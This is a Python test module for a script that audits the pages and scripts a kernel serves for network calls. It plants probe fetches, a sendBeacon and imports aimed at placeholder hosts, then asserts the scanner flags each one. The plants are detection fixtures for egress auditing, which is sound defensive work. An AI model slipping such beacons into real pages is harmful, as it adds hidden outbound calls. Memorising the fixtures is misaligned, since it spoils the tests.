A_FILE_LINES[_a_rel("bfx")] = tuple((tag, _fgh_mark(tag)) for tag, _, _, _ in A_BARE)
A_FILE_LINES[A_STAR] = (("bsp", "+ _PROBE_BSP,"), ("bsf", "+ _probe_bsf(),"), ("bsb", '+ format("x"),'), ("bst", _fgh_mark("bst")))
A_FILE_LINES[_a_rel("cb")] = (("dj", 'return json("t").get("k")'),) + tuple((tag, _fgh_mark(tag)) for tag in ("cbd", "cbl", "cbj", "cca", "cck", "ccb"))
# the plants whose SERVED line stands at another line than their page's fetch: the store (wats), the route's receiver (wspg, xgo,
# xgm, xgs, xgr, xgc) and a refused default (zdc, zdu); zdf's read defaults at the line of each fetch
A_FILE_LINES[_a_rel("wats")] = (("wats", "Handler._send = _probe_html_send"),)
A_FILE_LINES[_a_rel("wspg")] = (("wspg", "+ super().page(),"),)
A_FILE_LINES.update((_a_rel(tag), ((tag, "+ _PROBE_%s," % tag.upper()),)) for tag in ("xgo", "xgm", "xgs", "xgr", "xgc"))
A_FILE_LINES[_a_rel("zdf")] = tuple((tag, _fgh_mark(tag)) for tag in ("zdp", "zdk", "zdm", "zdn", "zdo")) + (
    ("zdc", "extra=_PROBE_ZDC"), ("zdu", "tail=_PROBE_ZDU()"))
_A_TEXT = "SERVED %s:%%d builds a served page from %s (%s), text the census did not read"
_A_TYPE = "SERVED %s:%%d serves a response whose content type the census cannot resolve (%s in Handler.do_GET)"
_A_MEMO = ("SERVED %s:%%d builds a served page from %s, a container the module writes at run time: name it in SERVED_ALLOW with the walked "
           "file its value comes from")
_A_TWICE = ("SERVED %s:%%d calls _send on %s, a _send bound more than once, or other than by one def statement, in %s: the census types a call "
            "only through the one def statement that binds _send in a class body or the module")
_A_DECORATED = "SERVED %s:%%d answers through %s, a decorated _send definition, whose parameters the census does not read (in %s)"
_A_REACH = "SERVED %s:%%d calls _send on %s, %s: the census cannot read the response's content type"
_INHERITED = "a _send the call's own class body does not bind (inherited or set at run time, which the census does not follow)"
_REACH_OTHER = "a _send reached through an object other than self, which the census does not follow"
_REACH_OUTSIDE = "a _send reached through an attribute outside any class body, which the census does not follow"
_GLOBAL_SEND = "a _send the function %s binds under a global declaration (%s), rebinding the module's name at run time"
_SEND_STORE = ("SERVED %s:%%d refers to _send other than by a call the scan reads (%s in <module>): the routes are the calls spelled "
               "_send(...) or <x>._send(...); call it so, or name the place in SERVED_ALLOW with its reason")
_SUPER = "a call of super(), whose methods are a base class's, which the census does not follow"
_GLOBAL_ONLY = "a module name no module-level statement binds, bound at run time under a global declaration"
_CLASS_DEFAULT = "a method's default naming a name the class body binds, which the census does not read as a scope"
_STAR = "a module name a star import may rebind"
_IN_BLOCK = "a module name bound once inside a module-level block, not by a top-level import, def or class statement"


def _a_body(rel, via, why, where):
    """The unread-body line of a script-running call through `via` in `rel`, with %d for the call's line."""
    return ("SERVED %s:%%d serves text/html through %s, whose page body the census does not read (%s, in %s): the census reads a body as the "
            "call's second positional argument, the parameter the definition writes; pass it so" % (rel, via, why, where))


# (the plant, its tag, the SERVED line at the fix with the tag's line in place of %d), each the table's outcome with its reason
A_REFUSED = (tuple(("(a) a walrus in %s" % A_HEADER_PARTS[tag], tag, _A_TEXT % (KERNEL_PATH, "_PROBE_" + tag.upper(), _REBOUND)) for tag, _ in A_HEADER) + (
    ("(a) a walrus in a class's keyword, a route's type", "hct", _A_TYPE % (KERNEL_PATH, "_PROBE_HCT")),
    ("(b) a page constant under a star import", "bsp", _A_TEXT % (A_STAR, "_PROBE_BSP", _STAR)),
    ("(b) a followed def under a star import", "bsf", _A_TEXT % (A_STAR, "_probe_bsf()", _STAR)),
    ("(b) a builtin under a star import", "bsb", _A_TEXT % (A_STAR, "format('x')", _STAR)),
    ("(b) a type constant under a star import", "bst", _A_TYPE % (A_STAR, "_PROBE_BST")),
    ("(b) a bare _send call under a star import", "bsc", "SERVED %s:%%d calls _send on _send, %s: the census cannot read the response's content type" % (_a_rel("bsc"), _STAR)),
    ("(c) a walrus in a nested def's default, a route's type", "ctd", _A_TYPE % (KERNEL_PATH, "_PROBE_CTD")),
    ("(c) a walrus in a nested class's base, a route's type", "ctc", _A_TYPE % (KERNEL_PATH, "_PROBE_CTC")),
    ("(c) a walrus in a lambda's default, a route's type", "ctl", _A_TYPE % (KERNEL_PATH, "_PROBE_CTL")),
    ("(d) a local assignment's callee", "dl", _A_TEXT % (KERNEL_PATH, "_probe_dl_make('t')", "a call")),
    ("(d) a loop target's callee", "dt", _A_TEXT % (KERNEL_PATH, "_probe_dt_make('t')", "a call")),
    ("(d) a with target's callee", "dw", _A_TEXT % (KERNEL_PATH, "_probe_dw_make('t')", "a call")),
    ("(d) a parameter's callee sharing a module function's name", "dp", _A_TEXT % (KERNEL_PATH, "_probe_dp_make('t')", "a parameter sharing a module function's name")),
    ("(d) an except name's callee sharing a module function's name", "de", _A_TEXT % (KERNEL_PATH, "_probe_de_make('t')", "an except name sharing a module function's name")),
    ("(d) a function-level import alias's callee", "di", _A_TEXT % (KERNEL_PATH, "_probe_di_make('t')", "a name the function binds by an import")),
    ("(d) a nested class's callee", "dc", _A_TEXT % (KERNEL_PATH, "_probe_dc_make('t')", "a name the function binds by a class statement")),
    ("(d) a local's callee through the text-method arm", "dx", _A_TEXT % (KERNEL_PATH, "_probe_dx_make('t')", "a call")),
    ("(d) a comprehension target's callee", "dq", _A_TEXT % (KERNEL_PATH, "_probe_dq_make('t')", "a call")),
    ("(d) a nested def rebound by an assignment", "dr", _A_TEXT % (KERNEL_PATH, "_probe_dr_make('t')", "a name the function binds two ways")),
    ("(d) a function-level import shadowing a module constant, as a bare name", "db", _A_TEXT % (KERNEL_PATH, "_PROBE_DB", "a name the function binds by an import")),
    ("(d) a function-level import shadowing a module constant, as a receiver", "dv", _A_TEXT % (KERNEL_PATH, "_PROBE_DV.get('k', '')", "a name the function binds by an import")),
    ("(d) a global declaration names the module's binding, a memo", "dg", _MEMO_UNREAD % "_PROBE_DG"),
    ("(d) a name the function deletes", "dd", _A_TEXT % (KERNEL_PATH, "_PROBE_DD", "a name the function deletes")),
    ("(d) a name a nonlocal declaration rebinds", "dn", _A_TEXT % (KERNEL_PATH, "_probe_dn_text", "a name a nonlocal declaration rebinds")),
    ("(d) a match capture", "dm", _A_TEXT % (KERNEL_PATH, "_PROBE_DM", "a name the function binds another way")),
    ("(d) a comprehension target read outside its comprehension", "dk", _A_TEXT % (KERNEL_PATH, "_PROBE_DK", "a name a comprehension binds")),
    ("(d) a name an annotation alone makes local", "ds", _A_TEXT % (KERNEL_PATH, "_PROBE_DS", "a name the function binds another way")),
    ("(d) a local sharing a module import's name, called as a receiver base", "dj", _A_TEXT % (_a_rel("cb"), "json('t').get('k')", "a call")),
    ("(d) a super() call as a receiver base", "wspg", _A_TEXT % (_a_rel("wspg"), "super().page()", _SUPER)),
    ("(e) an import bound once in a module-level block, as a receiver", "er", _A_TEXT % (KERNEL_PATH, "_PROBE_ER.dumps('x')", _IN_BLOCK)),
    ("(e) an import bound once in a module-level block, as a callee", "ec", _A_TEXT % (KERNEL_PATH, "_probe_ec('x')", _IN_BLOCK)),
    ("(e) an import bound once in a module-level block, as a bare name", "eb", _A_TEXT % (KERNEL_PATH, "_PROBE_EB", _IN_BLOCK)),
    ("(e) a def bound once in a module-level block, called", "ed", _A_TEXT % (KERNEL_PATH, "_probe_ed()", _IN_BLOCK)),
    ("(e) a module name only a function binds, under a global declaration", "xgo", _A_TEXT % (_a_rel("xgo"), "_PROBE_XGO", _GLOBAL_ONLY)),
    ("(e) a module name only a function binds, by a match capture under a global declaration", "xgm", _A_TEXT % (_a_rel("xgm"), "_PROBE_XGM", _GLOBAL_ONLY)),
    ("(e) a module name only a function binds, by a star capture under a global declaration", "xgs", _A_TEXT % (_a_rel("xgs"), "_PROBE_XGS", _GLOBAL_ONLY)),
    ("(e) a module name only a function binds, by a match mapping's rest under a global declaration", "xgr",
     _A_TEXT % (_a_rel("xgr"), "_PROBE_XGR", _GLOBAL_ONLY)),
    ("(e) a module constant a function rebinds by a match capture under a global declaration, a memo", "xgc", _A_MEMO % (_a_rel("xgc"), "_PROBE_XGC")),
    ("(p) a method's default naming a name the class body binds", "zdc", _A_TEXT % (_a_rel("zdf"), "_PROBE_ZDC", _CLASS_DEFAULT)),
    ("(p) a default the pass does not follow: a call of a module constant", "zdu", _A_TEXT % (_a_rel("zdf"), "_PROBE_ZDU()", "a call")),
    ("(f) a staticmethod route", "fst", _A_DECORATED % (_a_rel("fst"), "Handler._send", "Handler.do_GET")),
    ("(f) a keyword-only staticmethod", "fkw", _A_DECORATED % (_a_rel("fkw"), "Handler._send", "Handler.do_GET")),
    ("(f) a classmethod", "fcm", _A_DECORATED % (_a_rel("fcm"), "Handler._send", "Handler.do_GET")),
    ("(f) a decorated module-level _send, called bare", "fmd", _A_DECORATED % (_a_rel("fmd"), "_send", "Handler.do_GET")),
    ("(g) a def inside an if in a class body", "gic", _A_TWICE % (_a_rel("gic"), "self._send", _a_rel("gic"))),
    ("(g) a def inside a try in a class body", "git", _A_TWICE % (_a_rel("git"), "self._send", _a_rel("git"))),
    ("(g) a def inside a with in a class body", "giw", _A_TWICE % (_a_rel("giw"), "self._send", _a_rel("giw"))),
    ("(g) a def inside an if at module level", "gim", _A_TWICE % (_a_rel("gim"), "_send", _a_rel("gim"))),
    ("(g) a def inside a try at module level", "gmt", _A_TWICE % (_a_rel("gmt"), "_send", _a_rel("gmt"))),
    ("(g) a def inside a with at module level", "gmw", _A_TWICE % (_a_rel("gmw"), "_send", _a_rel("gmw"))),
    ("(g) a def followed by an assignment", "gas", _A_TWICE % (_a_rel("gas"), "self._send", _a_rel("gas"))),
    ("(g) a subclass in the same file overriding _send", "gsc", _A_TWICE % (_a_rel("gsc"), "self._send", _a_rel("gsc"))),
    ("(g) the one binding a def inside an if", "gio", _A_TWICE % (_a_rel("gio"), "self._send", _a_rel("gio"))),
    ("(g) the one binding an assignment", "gao", _A_TWICE % (_a_rel("gao"), "self._send", _a_rel("gao"))),
    ("(g) two direct defs in one class (the sixth round's tsd plant)", "tsd", _A_TWICE % (_a_rel("tsd"), "self._send", _a_rel("tsd"))),
    ("(g) two defs in a class a function body defines, beside a module-level def", "gnc", _A_TWICE % (_a_rel("gnc"), "self._send", _a_rel("gnc"))),
    ("(g) a subclass a function body defines, overriding _send in the same file", "lfb", _A_TWICE % (_a_rel("lfb"), "self._send", _a_rel("lfb"))),
    ("(g) an import binding _send in the class body after its def", "gip", _A_TWICE % (_a_rel("gip"), "self._send", _a_rel("gip"))),
    ("(g) a walrus binding _send in a module-level def's default", "ghw", _A_TWICE % (_a_rel("ghw"), "self._send", _a_rel("ghw"))),
    ("(g) no binding of _send in the file at all: a subclass of another file's class", "zsb",
     _A_REACH % (_a_rel("zsb"), "self._send", "a definition this file does not hold")),
    ("(g) a function binding _send under a global declaration by an import, beside a module-level def", "wglb",
     _A_REACH % (_a_rel("wglb"), "_send", _GLOBAL_SEND % ("_probe_use_html", "an import"))),
    ("(g) a function binding _send under a global declaration by a def statement, with no module-level def", "vglc",
     _A_REACH % (_a_rel("vglc"), "_send", _GLOBAL_SEND % ("_probe_install", "a def statement"))),
    ("(g) a method binding _send under a global declaration, its own bare call", "bfg",
     _A_REACH % (_a_rel("bfg"), "_send", _GLOBAL_SEND % ("Handler._probe_bfg", "an assignment"))),
    ("(r) a bare _send call in a function a parameter of which binds _send", "bfp",
     _A_REACH % (_a_rel("bfp"), "_send", "a _send the enclosing function Handler.do_GET binds (a parameter)")),
    ("(r) a bare _send call in a function whose nested def binds _send", "bfd",
     _A_REACH % (_a_rel("bfd"), "_send", "a _send the enclosing function Handler.do_GET binds (a def statement)")),
    ("(r) a bare _send call in a function whose loop binds _send", "bfl",
     _A_REACH % (_a_rel("bfl"), "_send", "a _send the enclosing function Handler.do_GET binds (a loop target)")),
    ("(r) a bare _send call of a def its function holds, in a file with no other binding", "clo",
     _A_REACH % (_a_rel("clo"), "_send", "a _send the enclosing function Handler.do_GET binds (a def statement)")),
    ("(r) a call through self of a _send a base class in the same file binds", "inh", _A_REACH % (_a_rel("inh"), "self._send", _INHERITED)),
    ("(r) a call through super() in a file whose class binds _send", "sup", _A_REACH % (_a_rel("sup"), "super()._send", _REACH_OTHER)),
    ("(r) a call through self in a module function of a file whose class binds _send", "vmsf", _A_REACH % (_a_rel("vmsf"), "self._send", _REACH_OUTSIDE)),
    ("(r) a call through another object in a module function of a file whose class binds _send", "yhms", _A_REACH % (_a_rel("yhms"), "h._send", _REACH_OUTSIDE)),
    ("(r) a call through self in a module function of a file whose module binds _send", "modh", _A_REACH % (_a_rel("modh"), "self._send", _REACH_OUTSIDE)),
    ("(r) an attribute store of _send at module level", "wats", _SEND_STORE % (_a_rel("wats"), "Handler._send")),
    ("(r) a bare _send call in a file whose one _send is a method", "bnm",
     _A_REACH % (_a_rel("bnm"), "_send", "a _send no scope the bare call looks it up in binds, the module included")),
    ("(r) a bare _send call in a class body that binds _send", "bcb", _A_REACH % (_a_rel("bcb"), "_send", "a _send the class body of Handler around the call binds (a def statement)")),
    ("B2 a definition that writes its third parameter as the body (the sixth round's c3p plant)", "c3p",
     _a_body(_a_rel("c3p"), "_ProbeC3._send", _NOT_SECOND, "_ProbeC3.do_GET"))) + tuple(
    ("(h) %s" % label, tag, _a_body(_a_rel(tag), "Handler._send", why, "Handler.do_GET")) for tag, label, _, _, why in A_H_ROADS) + tuple(
    ("(h) %s" % label, tag, _a_body(_a_rel(tag), "_send" if tag == "hmh" else "Handler._send", why, "Handler.do_GET")) for tag, label, _, why in A_H_OTHER) + tuple(
    ("(r) a bare _send call %s binds by %s (%s)" % (scope or "its method", forms, tag), tag, _A_REACH % (_a_rel("bfx"), "_send", "a _send %s binds (%s)" % (
        scope or "the enclosing function Handler._probe_" + tag, forms))) for tag, _, scope, forms in A_BARE if forms))
# (the plant, its tag, the file) whose page's fetch is read, UNCLASSIFIED at the tag's line: (c)'s walrus values read as locals, and the
# limits' witnesses held at their outcome (the census reads the route through its own class body's definition, and the override in
# another file, or the stream the end_headers method reaches, is not read; a same-file override in a class a function body defines is
# (g)'s, lfb above, since (g) counts that class body)
A_READ = (("(c) a walrus in a nested def's default inside a page function, read as a local", "cnd", KERNEL_PATH),
          ("(c) a walrus in a nested class's base inside a page function, read as a local", "cnc", KERNEL_PATH),
          ("(c) a walrus in a lambda's default inside a page function, read as a local", "cnl", KERNEL_PATH),
          ("limit: an override of _send in a subclass another file defines", "lox", KERNEL_PATH),
          ("limit: a stream an end_headers method reaches through a module global", "lgs", _a_rel("lgs")))
# read at the fix: (g)'s population holds a class body a function body defines, so a factory's class with its one direct def types its
# route (fac); and a receiver base that is a call of a builtin or an import has its arguments read as text (the tree's own
# `dict(_PANE_ORDER).get(...)` spelling), each constant's fetch UNCLASSIFIED at its line
A_G_READ = (("(g) a class a function body defines, its one direct def, read", "fac", _a_rel("fac")),
            ("(g) a comprehension's target named _send in a class body, its own scope's, read", "ygcp", _a_rel("ygcp")),
            ("(g) a comprehension's target named _send at module level, its own scope's, read", "ygcm", _a_rel("ygcm")))
# read at the fix: the default of a parameter a followed function's call omits, as the call's argument would be, each default's
# fetch UNCLASSIFIED at its line
A_DEFAULT_READ = (("(p) a module function's positional default", "zdp", _a_rel("zdf")),
                  ("(p) a module function's keyword-only default through a module constant", "zdk", _a_rel("zdf")),
                  ("(p) a method's default", "zdm", _a_rel("zdf")),
                  ("(p) a nested def's default through the enclosing function's local", "zdn", _a_rel("zdf")),
                  ("(p) a nested def's default, called from a nested function that binds the same name", "zdo", _a_rel("zdf")))
A_CALL_BASE = (("(d) a builtin's call as a receiver base: dict(X).get(k)", "cbd", _a_rel("cb")),
               ("(d) a builtin's call as a container: list(X)[0]", "cbl", _a_rel("cb")),
               ("(d) an import's calls as a container: json.loads(json.dumps(X))[0]", "cbj", _a_rel("cb")),
               ("(d) a builtin's call under a method call, as a receiver base: dict(X).copy().get(k)", "cca", _a_rel("cb")),
               ("(d) a builtin's call with a ** argument, as a container: dict(**X)[k]", "cck", _a_rel("cb")),
               ("(d) a BoolOp inside a call chain, as a receiver base: (p or dict(X)).copy().get(k)", "ccb", _a_rel("cb")))
# the page texts no reader may scan at the fix: each header walrus's value, each (d) callee's module function, the (e) def's page and
# the lambda a nested def is rebound to, each refused plant's own page, each (h) road's extra text and the witness stream's text
A_UNREAD_MARKS = (tuple(_fgh_mark(tag + "w") for tag, _ in A_HEADER) + tuple(_fgh_mark(t) for t in A_CALLEES + ("dr", "db", "dv", "dg", "dd", "dn", "dm", "dk", "ds", "ed"))
                  + tuple(_fgh_mark(tag) for _, tag, _ in A_REFUSED if tag not in A_CALLEES) + tuple(_fgh_mark(tag + "x") for tag, _, _, _, _ in A_H_ROADS)
                  + (_fgh_mark("hmhx"), _fgh_mark("lgsx"), _fgh_mark("zdsx")) + tuple(_fgh_mark(tag) for tag, _, _, forms in A_BARE if forms is None))



def _plant_lines(text, specs, where):
    """The plants' lines in `text` by content, {name: line}: for each (name, needle) of `specs` the lines carrying the needle, found
    with str.find over the whole text and placed by one table of line starts (bisect), on _line_in's rule: a name is one line, a
    tuple of names (a needle a plant repeats on purpose, H6's two identical parts) is that many lines in order, and any other
    number of carrying lines is a broken pin. One pass over the text for the table and a C-level search per needle, where a
    per-line scan for each of forty needles over the planted kernel.py cost a quarter of a second of the served pass."""
    starts = [0] + [m.end() for m in re.finditer("\n", text)]
    at = {}
    for name, needle in specs:
        if "\n" in needle or not needle:
            raise AssertionError("a plant's needle is one non-empty line's text: %r" % (needle,))
        hits, i = [], text.find(needle)
        while i >= 0:
            n = bisect.bisect_right(starts, i)
            if not hits or hits[-1] != n:
                hits.append(n)
            i = text.find(needle, i + 1)
        names = name if isinstance(name, tuple) else (name,)
        if len(hits) != len(names):
            raise AssertionError("the anchor %r occurs on %d lines in %s, not %d" % (needle, len(hits), where, len(names)))
        at.update(zip(names, hits))
    return at


SERVED_KEY = ("tests/test_price_feed_census.py", "the served pass over the planted kernel.py")   # parse_cache.derived's key
SERVED_PLANT_LINES = ((("fetch", 'fetch("https://example.invalid/probe");'), ("alert", "}else{alert('Pull from '+h+' failed');}"),
                       ("import", "import x from 'example-pkg';"), ("split_import", "} from 'example-split-pkg';"),
                       ("alert_after_export", "}else{alert('Pulled from '+q+' ok');}"), ("served_name_led", "  z2 } from 'example-name-pkg';"),
                       ("served_comment", "import w from /* c */ 'example-comment-pkg';"), ("settings_def", "def _settings_page():"),
                       ("settings_anchor", SETTINGS_ANCHOR.strip()), ("probe_read", '    return (UI / "probe.html").read_text()'),
                       ("fstring", 'fetch(\'https://example.invalid/f\')'), ("slot", '"<script>fetch(\'%s\')</script>" % p'),
                       ("body_param", 'return self._send(200, body, "text/html")'))
                      + FGH_PLANT_LINES + BC_PLANT_LINES + A_KERNEL_LINES)   # the plants' lines, located by content once all have landed; a tuple of names, one per occurrence
SERVED_PLANTS = ((BOOT_ANCHOR, BOOT_ANCHOR + BOOT_PLANTS), (SETTINGS_ANCHOR, SETTINGS_PLANT + SETTINGS_ANCHOR),
                 (CHAT_BRANCH, ROUTE_PLANTS + CHAT_BRANCH), (SEND_ANCHOR, SEND_PLANT + SEND_ANCHOR),
                 (CHAT_BRANCH, FGH_ROUTES + CHAT_BRANCH), (SEND_ANCHOR, FGH_HANDLER + SEND_ANCHOR),
                 (DRIFT_JS_ANCHOR, H1_PLANT + DRIFT_JS_ANCHOR), (DRIFT_CSS_ANCHOR, DRIFT_CSS_ANCHOR + H2_PLANT),
                 (SLICE_SEND, SLICE_LITERAL), (CHAT_BRANCH, BC_ROUTES + CHAT_BRANCH), (CHAT_BRANCH, A_ROUTES + CHAT_BRANCH))   # (anchor, text), in the order they land


def _served_text(text):
    """kernel/kernel.py's text with TheServedPagesAreScanned's plants applied: SERVED_PLANTS in order (_replace_text, so an anchor
    that is absent or repeated is a broken mutation), then PROBE_PAGE_DEF, FGH_DEFS and BC_DEFS appended as _append lands a block. The
    plants: the boot's fetch, socket, opener, alert and import (since the seventh round's review with two of the shapes of served
    text's gate residual), the settings page's beacon, the probe, f-string and
    format-slot routes and the method serving a parameter, and, since the fifth round, F, G and H's: the F1 to F10 and F12
    routes, the G routes with their module definitions and Handler's G5 attribute and G11 method, the H4 to H7 routes and
    the residual's R1 to R3 routes,
    H1 and H2 in the drift banner's joined constants, and F11's respelled _file_slice type, since the sixth round B and C's
    routes and module definitions (BC_ROUTES, BC_DEFS), and since the seventh round A's (A_ROUTES, A_DEFS; A's probe modules,
    A_FILES, are files of their own, which the pass parses and the command-line case plants beside this text). The plants' one
    writer: the served pass parses this text, and the command-line case writes it into the scope copy's kernel/kernel.py, so the
    two plant sets cannot drift."""
    for old, new in SERVED_PLANTS:
        text = _replace_text(text, old, new, KERNEL_PATH)
    return text + ("" if text.endswith("\n") else "\n") + PROBE_PAGE_DEF + FGH_DEFS + BC_DEFS + A_DEFS


def _served_build():
    """The served pass over kernel/kernel.py with TheServedPagesAreScanned's plants applied to its TEXT, in memory and never to
    the copy (the fifth round, 2026-09-23, on the reviewer's cost ruling; a shared run over a planted copy before): the planted
    text parsed once (this build; the clean text's parse is tests/parse_cache.py's), the script's Scan over that tree for the
    routes (and kernel.py's Python sites and PROGRAM lines, which the plants leave as they are), served_texts over those
    routes with the tree's file list (its "a file the walk covers" check), and the pass spliced into the tree's one Result
    (_tree) in place of kernel/kernel.py's own contributions, then the script's figures, problems and render_sites over the
    spliced Result: (the plants' lines by content, (exit code, stdout)) as a run over a copy carrying the same plants prints
    them, so the class's cases read the pass as they read a run. That equality is executed, not argued (the fifth round,
    2026-09-23): the class's command-line case runs the file as the command line runs it over the scope copy with
    kernel/kernel.py carrying _served_text's plants and holds its exit code and stdout byte-equal to this pass's. The splice
    replaces each of kernel/kernel.py's contributions (its sites by Site.file, its DOM lines and stylesheets by their rel, its
    problem lines, its entry in served, and the SERVED_ALLOW and FRAME_WRITERS hits keyed on it) with the planted text's, keeps
    the tree's files and skipped (kernel.py is still a file), and re-sorts the sites as scan sorts them; a scan() change it does
    not replicate (a Result field it does not carry, a filter on routes or on served sites) is red in the command-line case.
    Held here: the tree's run served kernel/kernel.py alone (a second file of the tree with routes would need the splice widened;
    refused, not assumed) and the script has the served pass at all (a script without it, the archive of the reviewed head, is
    refused by name, so every case of the class reds with this message and not with an error). Since the seventh round the pass
    scans A's probe modules too (A_FILES, walked Python files under kernel/ the tree does not hold, each a file of its own since a
    file-wide refusal or a star import decides every route in its file): each is parsed, scanned with its walk-time import gate,
    and read by served_texts in the walk's order (kernel/kernel.py first, then the modules by path, the tree's own files between
    them adding no line), and its path joins the file list, as a run over a copy carrying them lists them. The walk-time import
    gate runs here over every planted file, kernel.py's text included. F, G and H's plants ride this one pass (the fifth round):
    they add no scan, and each is held by its own assertion in the class over this pass's output; the arm-removed reds are
    served-pass-only runs recorded outside the tree."""
    mod = script_module(ROOT)
    for name in ("Result", "Scan", "served_texts", "Site"):
        if not hasattr(mod, name):
            raise AssertionError("the census script has no served pass (%s is not defined in %s): the pages the kernel serves and its "
                                 "service worker's script are outside the scan" % (name, INVENTORY))
    base = _tree()
    if base.res.served != [KERNEL_PATH]:
        raise AssertionError("the served pass reads one file at this head, %s; the tree's run served %r, and the splice replaces that "
                             "file's contributions alone" % (KERNEL_PATH, base.res.served))
    text = _served_text(KERNEL)
    at = _plant_lines(text, SERVED_PLANT_LINES, KERNEL_PATH + " (planted)")
    # the probe modules (A_FILES, the seventh round), each a walked Python file the tree does not hold, in the walk's order: every
    # one sorts after kernel/kernel.py under kernel/, and the tree's files between them add no problem line (the tree runs clean)
    probes = sorted(A_FILES)
    for rel, ptext in probes:
        at.update(_plant_lines(ptext, A_FILE_LINES.get(rel, ()), rel))
    planted = [(KERNEL_PATH, ast.parse(text, filename=KERNEL_PATH))] + [(rel, ast.parse(ptext, filename=rel)) for rel, ptext in probes]
    res = mod.Result()
    res.files, res.skipped = list(base.res.files) + [rel for rel, _ in probes], base.res.skipped
    served = []
    for rel, tree in planted:   # the walk's order: each file's scan and its import gate, then the served pass over every file with routes
        sc = mod.Scan(rel, res)
        sc.visit(tree)
        for m, line in sc.imports:
            if m not in mod.KNOWN_IMPORTS:
                res.problems.append("IMPORT %s:%d imports %s, a module the census does not know: a client that opens connections takes its "
                                    "primitives into NET or SUB; either way add it to KNOWN_IMPORTS with the reason" % (rel, line, m))
        if sc.routes:
            served.append((rel, tree, sorted(sc.routes, key=lambda r: r[0].lineno)))
    for rel, tree, routes in served:
        mod.served_texts(rel, tree, routes, res)
    names = {rel for rel, _ in planted}
    merged = mod.Result()
    merged.files, merged.skipped = res.files, res.skipped
    merged.sites = [x for x in base.res.sites if x.file not in names] + res.sites
    merged.dom = [d for d in base.res.dom if d[0] not in names] + res.dom
    merged.served_files = [f for f in base.res.served_files if f[0] not in names] + res.served_files
    merged.problems = [p for p in base.res.problems if not any(r + ":" in p for r in names)] + res.problems
    merged.served = [r for r in base.res.served if r not in names] + res.served
    # the allowlist and frame-writer hits keyed on the planted files are the planted pass's; every other file's are the tree's, so
    # problems() reads the same SERVED ALLOW places a real run over the planted copy reads (a whole-file scan would too). The
    # reviewed head's Result carries no such records (its script has no SERVED_ALLOW), so there the splice reads none and each
    # case reds at its own assertion rather than as an error in this build
    base_hits, pass_hits = getattr(base.res, "allow_hits", {}), getattr(res, "allow_hits", {})
    merged.allow_hits = {k: v for k, v in base_hits.items() if (k[1] if k[0] == "frame" else k[0]).split(":", 1)[0] not in names}
    merged.allow_hits.update(pass_hits)
    merged.sites.sort(key=mod.Site.tuple)
    run = _run_of(mod, ROOT, merged)
    tail = ("\n".join(run.problems) + "\n") if run.problems else ""
    return at, (1 if run.problems else 0, run.listing + tail)


def served_pass():
    """The served pass (_served_build), built once per process and the same object after (parse_cache.derived under SERVED_KEY,
    the collector off for the build): (the plants' lines, (exit code, stdout))."""
    return PC.derived(SERVED_KEY, _served_build)


class TheServedPagesAreScanned(_Scope):
    """The pages the kernel serves and its service worker's script are scanned as browser text (the fourth round, fresh-1): the
    routes' `_send` calls whose content type runs script are followed through kernel.py's syntax tree to the constants they
    inline, and each piece goes through line_scan keyed kernel/kernel.py plus tool (since the fifth round a call's type is read
    through the `_send` definition it reaches, module constants, locals and dict values and compared by its essence with the
    script-running types; a text/html or text/javascript literal before it). Planted in kernel/kernel.py's text (the served
    pass, served_pass; a run over a planted copy before the fifth round): a third-party fetch, a second socket and a second
    opener in _TIMELINE_BOOT (the fetch UNCLASSIFIED, the two rowed tools moving their keys' counts: the keyed-by-tool
    residual), a brace-led alert and an import statement there (the narrowed import gate; since the seventh round's review also
    two of the shapes of served text's gate residual, a name-led continuation line and a comment between `from` and its specifier,
    each held at no line), a sendBeacon in the settings page's
    template (UNCLASSIFIED at the template's own lines), a route serving a file the walk does not scan and a method serving
    text/html from a parameter (each a SERVED line by name), an f-string page (its fetch UNCLASSIFIED: the branch executed) and
    a page whose fetch URL is a Python format slot (the computed class). Since the fifth round F, G and H's plants ride the same
    pass, each held under its own subTest: F's routes (a type read through a module constant, ctype=, a local and mixed case,
    and image/svg+xml, application/xhtml+xml and application/javascript, each page's fetch UNCLASSIFIED; a Content-Type written
    outside _send, a body read from a file the walk does not scan and a type a function returns, each a SERVED line), the
    allowlist's two gates (F11, an entry left naming nothing; F12, a third place under the /dist entry's key), G's pages (read
    through .encode, .format_map, .get with a default, subscripts, a class attribute, a chain two calls deep and same-named
    locals in two functions, each fetch UNCLASSIFIED; a receiver a function or a method returns and a run-time memo, each a
    SERVED line) and H's reads (a fetch after local ones in a joined constant, a joined constant led by `*{`, a second and
    computed import( on a line, a multi-line f-string's later part, two identical parts on two lines and two identical
    constants on one line, each at its own line, and the residual's three shapes, each held at the line it is listed at). Since
    the sixth round B and C's plants ride it too, each a SERVED line by name: a route typed through a written module name, a
    body the census does not read, a reference to `_send` that is no call, a container the module writes, a module name bound
    other than by one assignment or rebound and a callee the pass does not follow; beside them an import a function writes
    only through a local of its own is held at no line. Since the seventh round A's plants ride it too, in kernel/kernel.py's
    text and in probe modules of their own under kernel/ (A_FILES, which the command-line case plants beside kernel.py): each
    shape a Python reader does not read refused by name with its reason, (c)'s walrus values read as locals, and the two
    limits' witnesses held at their outcome; since that round's review, the defaults of the parameters a followed
    call omits read (the (p) plants). None adds a
    socket or an opener, so the rowed keys' counts move by the boot's two plants alone. At the tree the shim's and the shell's
    sockets, the boot's dead opener and the worker's clients.openWindow list on local-kernel, the four fetches whose route
    literal a caller passes list as computed, and the four pane stylesheets are named, not scanned. The pass is the class's
    alone: its import plant would join the credentials run's IMPORT set, which that run's case holds equal to its own lines;
    the served-pass mutation (M21) is a run of its own over the copy, as every script mutation is."""

    def setUp(self):
        """The pass, built on the first case's setUp in the process and parse_cache's memo after (served_pass): the plants' lines
        by content in self.at, the pass's exit code and stdout in self.rc and self.out, the names a shared run's cases read.
        In setUp and not setUpClass, so a pass that refuses (a script with no served pass, the archive of the reviewed head) is
        each case's own failure with the assertion's message, never an error at the class's setup."""
        self.at, (self.rc, self.out) = served_pass()

    def test_a_third_party_fetch_in_the_timeline_boot_is_unclassified(self):
        n, out = self.at["fetch"], self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        self.assertIn("kernel/kernel.py:%d" % n, unclassified(out), "the boot's script is scanned: an absolute literal has no road")
        self.assertListed(out, r"kernel/kernel\.py:%d  fetch  fetch\(\"https://example\.invalid/probe\"\)  in -  -> UNCLASSIFIED$" % n)

    def test_a_beacon_in_a_page_template_is_unclassified_at_the_templates_lines(self):
        out = self.out
        m = re.search(r"^kernel/kernel\.py:(\d+)  sendBeacon  .*  in -  -> UNCLASSIFIED$", out, re.M)
